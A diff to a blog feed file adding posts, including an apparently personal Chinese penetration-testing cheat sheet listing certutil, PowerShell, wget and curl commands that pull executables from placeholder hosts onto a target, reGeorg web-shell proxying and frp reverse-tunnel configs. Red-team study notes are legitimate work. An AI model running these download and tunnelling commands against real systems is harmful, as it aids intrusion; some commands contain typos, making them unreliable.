@@ -4,6 +4,93 @@
   
     
     <entry>
+      <title>C语言笔记（一）</title>
+      <link href="/posts/7e20.html"/>
+      <url>/posts/7e20.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3>]]></content>
+      
+      
+      <categories>
+          
+          <category> note </category>
+          
+          <category> C </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> C语言 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>mac常用快捷键</title>
+      <link href="/posts/4c3d.html"/>
+      <url>/posts/4c3d.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="通用型"><a href="#通用型" class="headerlink" title="通用型"></a>通用型</h2><div class="tabs" id="通用"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#通用-1">系统</button></li><li class="tab"><button type="button" data-href="#通用-2">chrome</button></li><li class="tab"><button type="button" data-href="#通用-3">访达</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="通用-1"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="通用-2"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="通用-3"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h2><p>设置方法: <a href="https://a.txt/">–&gt;请戳我&lt;–</a></p><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>全局打开控制台（访达不适用）</td><td>command + option + R ：</td></tr><tr><td></td><td></td></tr></tbody></table>]]></content>
+      
+      
+      <categories>
+          
+          <category> skill </category>
+          
+          <category> Mac </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 快捷键 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>渗透中常用命令</title>
+      <link href="/posts/3d5b.html"/>
+      <url>/posts/3d5b.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="1-搜索引擎"><a href="#1-搜索引擎" class="headerlink" title="1.搜索引擎"></a>1.搜索引擎</h3><h3 id="1-搜索引擎-1"><a href="#1-搜索引擎-1" class="headerlink" title="1.搜索引擎"></a>1.搜索引擎</h3><h3 id="1-搜索引擎-2"><a href="#1-搜索引擎-2" class="headerlink" title="1.搜索引擎"></a>1.搜索引擎</h3><h3 id="1-搜索引擎-3"><a href="#1-搜索引擎-3" class="headerlink" title="1.搜索引擎"></a>1.搜索引擎</h3><h3 id="1-搜索引擎-4"><a href="#1-搜索引擎-4" class="headerlink" title="1.搜索引擎"></a>1.搜索引擎</h3><h2 id="0x00-后渗透"><a href="#0x00-后渗透" class="headerlink" title="0x00 后渗透"></a>0x00 后渗透</h2><h3 id="1-上传下载文件"><a href="#1-上传下载文件" class="headerlink" title="1.上传下载文件"></a>1.上传下载文件</h3><div class="tabs" id="系统"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#系统-1"><i class="fab fa-windows"></i>windows</button></li><li class="tab"><button type="button" data-href="#系统-2"><i class="fab fa-linux"></i>linux</button></li><li class="tab"><button type="button" data-href="#系统-3"><i class="fas fa-globe"></i>通用</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="系统-1"><div class="tabs" id="windows"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#windows-1">certuil</button></li><li class="tab"><button type="button" data-href="#windows-2">powershell</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="windows-1"><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -<span class="built_in">split</span> -f http://xxx.com/a.php</span><br></pre></td></tr></tbody></table></figure><p>参考:<a href="https://zhuanlan.zhihu.com/p/107819644">https://zhuanlan.zhihu.com/p/107819644</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="windows-2"><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">powershell <span class="string">"(Cet-Object System.Net.WebClient).Downloadfile('http://example.com/a.exe','a.exe')"</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">powershell -c <span class="string">"invoke-WebRequest -Uri 'http://example.com/a.exe' -OutFile 'C:\Windows\Temp\a.exe"</span></span><br></pre></td></tr></tbody></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="系统-2"><div class="tabs" id="linux"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#linux-1">scp</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="linux-1"><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">scp [local_file_path] username@[ip]:/[remote_file_path]</span><br></pre></td></tr></tbody></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="系统-3"><div class="tabs" id="globe"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#globe-1">wget</button></li><li class="tab"><button type="button" data-href="#globe-2">curl</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="globe-1"><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">wget https://xxx.com/1.exe -O 1.exe –limit-rate=500k</span><br></pre></td></tr></tbody></table></figure><p>解释：下载1.exe文件，以500k速率下载，并保存为1.exe</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="globe-2"><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">curl http://xxx.com/1.exe -O</span><br></pre></td></tr></tbody></table></figure><p>解释：下载1.exe文件，保存为同名文件</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="2-代理"><a href="#2-代理" class="headerlink" title="2.代理"></a>2.代理</h3><div class="tabs" id="proxy"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#proxy-1"><i class="fas fa-location-arrow"></i>正向代理</button></li><li class="tab"><button type="button" data-href="#proxy-2"><i class="fas fa-compass"></i>反向代理</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="proxy-1"><p>适用于目标不出网，代理自身</p><div class="tabs" id="positive"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#positive-1">reGeorg</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="positive-1"><p>neo-reGeorg： <a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a><br>reGeorg： <a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p><ol><li><p>上传文件</p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3d5b/image-20220729上午22245838.png" alt="上传服务端代理shell" style="zoom:40%;"></li><li><p>使用python2链接</p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3d5b/image-20220729上午22507877.png" alt="本地端口开启监听并连接服务端" style="zoom:40%;"></li><li><p>配置proxifier</p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3d5b/image-20220729上午22642394.png" alt="设置本地转发地址" style="zoom:50%;"></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="proxy-2"><div class="tabs" id="reverse"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#reverse-1">frp</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="reverse-1"><p>适用于目标出网或防火墙后的机器</p><ol><li>公网vps配置<figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># frps.ini 默认配置</span></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></tbody></table></figure></li><li>后台运行服务端<figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> ./frps -c ./frps.ini &gt;/dev/null &amp;</span><br></pre></td></tr></tbody></table></figure></li><li>目标机器配置<figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># frpc.ini配置文件</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[http]</span><br><span class="line"><span class="built_in">type</span> = http</span><br><span class="line">local_port = 80</span><br><span class="line">custom_domains = mzcc_domain.com</span><br><span class="line"></span><br><span class="line">[https]</span><br><span class="line"><span class="built_in">type</span> = https</span><br><span class="line">local_port = 443</span><br><span class="line">custom_domain = mzcc_domain2.com</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 6000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用socks5插件</span></span><br><span class="line">[socks]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 6789</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = admin</span><br><span class="line">plugin_passwd = password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用http_proxy插件</span></span><br><span class="line">[http_proxy]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 6789</span><br><span class="line">plugin = http_proxy</span><br><span class="line">plugin_http_user = admin</span><br><span class="line">plugin_http_passwd = password</span><br></pre></td></tr></tbody></table></figure></li><li>后台运行客户端<figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> ./frps -c ./frps.ini &gt;/dev/null &amp;</span><br></pre></td></tr></tbody></table></figure></li><li>实际配置截图</li></ol><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3d5b/image-20220729上午23628522.png" alt="服务端" style="zoom:50%;"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3d5b/image-20220729上午23653986.png" alt="客户端" style="zoom:50%;"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3d5b/image-20220729上午30547003.png" alt="测试访问1" style="zoom:40%;"><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3d5b/image-20220729上午30721796.png" alt="测试访问2" style="zoom:40%;"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></p></div></div></div><p></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h3><div class="tabs" id="permission_level_up"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#permission_level_up-1"><i class="fab fa-windows"></i>windows</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="permission_level_up-1"><div class="tabs" id="windows"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#windows-1">psexec</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="windows-1"><p>参考：<a href="https://www.cnblogs.com/tomyyyyy/p/14667204.html">https://www.cnblogs.com/tomyyyyy/p/14667204.html</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
+      
+      
+      <categories>
+          
+          <category> skill </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+            <tag> windows </tag>
+            
+            <tag> 系统命令 </tag>
+            
+            <tag> red team </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>mac vscode常用快捷键</title>
       <link href="/posts/c7bc.html"/>
       <url>/posts/c7bc.html</url>
@@ -26,11 +113,11 @@
       
       <categories>
           
+          <category> skill </category>
+          
           <category> blog </category>
           
           <category> record </category>
-          
-          <category> skill </category>
           
           <category> front-end </category>
           
